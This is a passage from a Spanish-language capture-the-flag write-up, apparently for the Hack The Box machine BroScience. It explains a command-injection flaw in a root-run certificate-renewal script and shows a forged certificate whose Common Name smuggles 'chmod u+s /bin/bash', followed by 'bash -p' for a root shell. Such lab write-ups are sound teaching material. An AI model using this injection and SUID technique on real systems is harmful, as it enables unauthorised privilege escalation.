+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!/bin/bash                                                                                                          
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$#</span><span style="color:#a5d6ff">&#34;</span> -ne <span style="color:#a5d6ff">1</span> <span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">||</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#79c0ff">$1</span> <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;-h&#34;</span> <span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">||</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#79c0ff">$1</span> <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;--help&#34;</span> <span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">||</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#79c0ff">$1</span> <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;help&#34;</span> <span style="color:#ff7b72;font-weight:bold">]</span>; <span style="color:#ff7b72">then</span>                                                    
+</span></span><span style="display:flex;"><span>    echo <span style="color:#a5d6ff">&#34;Usage: </span><span style="color:#79c0ff">$0</span><span style="color:#a5d6ff"> certificate.crt&#34;</span>;                     
+</span></span><span style="display:flex;"><span>    exit 0;                 
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">fi</span>                                                                 
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[</span> -f <span style="color:#79c0ff">$1</span> <span style="color:#ff7b72;font-weight:bold">]</span>; <span style="color:#ff7b72">then</span>                                                                                                                     
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>    openssl x509 -in <span style="color:#79c0ff">$1</span> -noout -checkend <span style="color:#a5d6ff">86400</span> &gt; /dev/null
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[</span> <span style="color:#79c0ff">$?</span> -eq <span style="color:#a5d6ff">0</span> <span style="color:#ff7b72;font-weight:bold">]</span>; <span style="color:#ff7b72">then</span>                         
+</span></span><span style="display:flex;"><span>        echo <span style="color:#a5d6ff">&#34;No need to renew yet.&#34;</span>;                              
+</span></span><span style="display:flex;"><span>        exit 1;                                                                                                      
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">fi</span>                                                             
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">subject</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>openssl x509 -in <span style="color:#79c0ff">$1</span> -noout -subject | cut -d <span style="color:#a5d6ff">&#34;=&#34;</span> -f2-<span style="color:#ff7b72">)</span>                                                                   
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">country</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>echo <span style="color:#79c0ff">$subject</span> | grep -Eo <span style="color:#a5d6ff">&#39;C = .{2}&#39;</span><span style="color:#ff7b72">)</span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">state</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>echo <span style="color:#79c0ff">$subject</span> | grep -Eo <span style="color:#a5d6ff">&#39;ST = .*,&#39;</span><span style="color:#ff7b72">)</span>                                                                     
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">locality</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>echo <span style="color:#79c0ff">$subject</span> | grep -Eo <span style="color:#a5d6ff">&#39;L = .*,&#39;</span><span style="color:#ff7b72">)</span>                 
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">organization</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>echo <span style="color:#79c0ff">$subject</span> | grep -Eo <span style="color:#a5d6ff">&#39;O = .*,&#39;</span><span style="color:#ff7b72">)</span>                                                                                 
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">organizationUnit</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>echo <span style="color:#79c0ff">$subject</span> | grep -Eo <span style="color:#a5d6ff">&#39;OU = .*,&#39;</span><span style="color:#ff7b72">)</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">commonName</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>echo <span style="color:#79c0ff">$subject</span> | grep -Eo <span style="color:#a5d6ff">&#39;CN = .*,?&#39;</span><span style="color:#ff7b72">)</span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">emailAddress</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>openssl x509 -in <span style="color:#79c0ff">$1</span> -noout -email<span style="color:#ff7b72">)</span>
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">country</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">${</span><span style="color:#79c0ff">country</span>:<span style="color:#79c0ff">4</span><span style="color:#a5d6ff">}</span>                                                                                             
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">state</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>echo <span style="color:#a5d6ff">${</span><span style="color:#79c0ff">state</span>:<span style="color:#79c0ff">5</span><span style="color:#a5d6ff">}</span> | awk -F, <span style="color:#a5d6ff">&#39;{print $1}&#39;</span><span style="color:#ff7b72">)</span>                                                                  
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">locality</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>echo <span style="color:#a5d6ff">${</span><span style="color:#79c0ff">locality</span>:<span style="color:#79c0ff">3</span><span style="color:#a5d6ff">}</span> | awk -F, <span style="color:#a5d6ff">&#39;{print $1}&#39;</span><span style="color:#ff7b72">)</span>                                                            
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">organization</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>echo <span style="color:#a5d6ff">${</span><span style="color:#79c0ff">organization</span>:<span style="color:#79c0ff">4</span><span style="color:#a5d6ff">}</span> | awk -F, <span style="color:#a5d6ff">&#39;{print $1}&#39;</span><span style="color:#ff7b72">)</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">organizationUnit</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>echo <span style="color:#a5d6ff">${</span><span style="color:#79c0ff">organizationUnit</span>:<span style="color:#79c0ff">5</span><span style="color:#a5d6ff">}</span> | awk -F, <span style="color:#a5d6ff">&#39;{print $1}&#39;</span><span style="color:#ff7b72">)</span>                                                              
+</span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">commonName</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#ff7b72">$(</span>echo <span style="color:#a5d6ff">${</span><span style="color:#79c0ff">commonName</span>:<span style="color:#79c0ff">5</span><span style="color:#a5d6ff">}</span> | awk -F, <span style="color:#a5d6ff">&#39;{print $1}&#39;</span><span style="color:#ff7b72">)</span>
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>    echo <span style="color:#79c0ff">$subject</span>;                                        
+</span></span><span style="display:flex;"><span>    echo <span style="color:#a5d6ff">&#34;&#34;</span>;                              
+</span></span><span style="display:flex;"><span>    echo <span style="color:#a5d6ff">&#34;Country     =&gt; </span><span style="color:#79c0ff">$country</span><span style="color:#a5d6ff">&#34;</span>;                                                                                                    
+</span></span><span style="display:flex;"><span>    echo <span style="color:#a5d6ff">&#34;State       =&gt; </span><span style="color:#79c0ff">$state</span><span style="color:#a5d6ff">&#34;</span>;           
+</span></span><span style="display:flex;"><span>    echo <span style="color:#a5d6ff">&#34;Locality    =&gt; </span><span style="color:#79c0ff">$locality</span><span style="color:#a5d6ff">&#34;</span>;  
+</span></span><span style="display:flex;"><span>    echo <span style="color:#a5d6ff">&#34;Org Name    =&gt; </span><span style="color:#79c0ff">$organization</span><span style="color:#a5d6ff">&#34;</span>;
+</span></span><span style="display:flex;"><span>    echo <span style="color:#a5d6ff">&#34;Org Unit    =&gt; </span><span style="color:#79c0ff">$organizationUnit</span><span style="color:#a5d6ff">&#34;</span>;                       
+</span></span><span style="display:flex;"><span>    echo <span style="color:#a5d6ff">&#34;Common Name =&gt; </span><span style="color:#79c0ff">$commonName</span><span style="color:#a5d6ff">&#34;</span>;    
+</span></span><span style="display:flex;"><span>    echo <span style="color:#a5d6ff">&#34;Email       =&gt; </span><span style="color:#79c0ff">$emailAddress</span><span style="color:#a5d6ff">&#34;</span>;                                                                             
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>    echo -e <span style="color:#a5d6ff">&#34;\nGenerating certificate...&#34;</span>;                
+</span></span><span style="display:flex;"><span>    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days <span style="color:#a5d6ff">365</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;&lt;</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$country</span><span style="color:#a5d6ff">                  
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    </span><span style="color:#79c0ff">$state</span><span style="color:#a5d6ff">           
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    </span><span style="color:#79c0ff">$locality</span><span style="color:#a5d6ff">                                                      
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    </span><span style="color:#79c0ff">$organization</span><span style="color:#a5d6ff">                                                  
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    </span><span style="color:#79c0ff">$organizationUnit</span><span style="color:#a5d6ff">                                              
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    </span><span style="color:#79c0ff">$commonName</span><span style="color:#a5d6ff">                                                    
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    </span><span style="color:#79c0ff">$emailAddress</span><span style="color:#a5d6ff">                                                  
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    &#34;</span> 2&gt;/dev/null                                                  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    /bin/bash -c <span style="color:#a5d6ff">&#34;mv /tmp/temp.crt /home/bill/Certs/</span><span style="color:#79c0ff">$commonName</span><span style="color:#a5d6ff">.crt&#34;</span>                                                                   
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">else</span>                                                               
+</span></span><span style="display:flex;"><span>    echo <span style="color:#a5d6ff">&#34;File doesn&#39;t exist&#34;</span>                                      
+</span></span><span style="display:flex;"><span>    exit 1;
+</span></span></code></pre></div><p>El script valida inicialmente que se haya proporcionado un único argumento correspondiente a un certificado. Posteriormente, comprueba que el archivo exista y verifica si expirará durante las próximas 24 horas.</p>
+<p>Si el certificado continúa siendo válido por más de 24 horas, el script finaliza sin realizar ninguna acción.</p>
+<p>Cuando el certificado está próximo a expirar, se extrae su campo <em>Subject</em>, que contiene información similar a la siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">subject</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">C</span> <span style="color:#ff7b72;font-weight:bold">=</span> US, <span style="color:#79c0ff">ST</span> <span style="color:#ff7b72;font-weight:bold">=</span> Texas, <span style="color:#79c0ff">L</span> <span style="color:#ff7b72;font-weight:bold">=</span> Austin, <span style="color:#79c0ff">O</span> <span style="color:#ff7b72;font-weight:bold">=</span> BroScience, <span style="color:#79c0ff">OU</span> <span style="color:#ff7b72;font-weight:bold">=</span> IT, <span style="color:#79c0ff">CN</span> <span style="color:#ff7b72;font-weight:bold">=</span> broscience.htb
+</span></span></code></pre></div><p>A continuación, el script obtiene cada uno de los campos (<code>C</code>, <code>ST</code>, <code>L</code>, <code>O</code>, <code>OU</code> y <code>CN</code>) y los reutiliza para generar un nuevo certificado autofirmado. Finalmente, dicho certificado es almacenado temporalmente en <code>/tmp/temp.crt</code> y movido al directorio <code>/home/bill/Certs</code>.</p>
+<p>La línea vulnerable es la siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/bash -c <span style="color:#a5d6ff">&#34;mv /tmp/temp.crt /home/bill/Certs/</span><span style="color:#79c0ff">$commonName</span><span style="color:#a5d6ff">.crt&#34;</span>
+</span></span></code></pre></div><p>El valor de <code>$commonName</code> proviene directamente del certificado proporcionado por el usuario. Debido a que este valor es interpolado dentro de un comando ejecutado mediante <code>bash -c</code>, sin ningún mecanismo de sanitización o escapado, es posible inyectar comandos arbitrarios a través del campo <code>CN</code>.</p>
+<p>Dado que el script es ejecutado por <code>root</code>, cualquier comando inyectado se ejecutará con privilegios elevados, permitiendo una escalada de privilegios.</p>
+<h2 id="generando-un-certificado-malicioso">
+  Generando un certificado malicioso
+  <a class="heading-link" href="#generando-un-certificado-malicioso">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>El certificado procesado periódicamente por el script corresponde a:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/home/bill/Certs/broscience.crt
+</span></span></code></pre></div><img src="/images/Pasted image 20260605152843.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Como el usuario <code>bill</code> posee permisos de escritura sobre dicho directorio, podemos reemplazar el certificado legítimo por uno controlado por nosotros:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl req -x509 -sha256 -nodes -days <span style="color:#a5d6ff">1</span> -newkey rsa:4096 -keyout /dev/null -out broscience.crt
+</span></span></code></pre></div><p>El campo relevante para la explotación es <code>Common Name (CN)</code>. Por tanto, introducimos nuestra carga útil en dicho campo. En este caso utilizaremos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod u+s /bin/bash
+</span></span></code></pre></div><img src="/images/Pasted image 20260605153202.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Una vez reemplazado el certificado, únicamente debemos esperar a que la tarea programada ejecutada por <code>root</code> procese el archivo.</p>
+<p>Después de unos instantes, verificamos que el bit SUID ha sido establecido correctamente:</p>
+<img src="/images/Pasted image 20260605153252.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Finalmente, obtenemos una shell con privilegios de <code>root</code> ejecutando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -p
+</span></span></code></pre></div><p>Con ello obtenemos acceso completo al sistema y podemos recuperar la flag <code>root.txt</code>.</p>
+<img src="/images/Pasted image 20260605153339.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="conclusión">
+  Conclusión
+  <a class="heading-link" href="#conclusi%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>La explotación de BroScience se basa en una cadena de vulnerabilidades que incluye un Local File Inclusion para obtener información sensible, la predicción de códigos de activación generados de forma insegura, una vulnerabilidad de deserialización insegura que conduce a ejecución remota de comandos y la reutilización de credenciales almacenadas en la base de datos. Finalmente, una inyección de comandos en un script ejecutado por <code>root</code> permite escalar privilegios y comprometer completamente el sistema.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
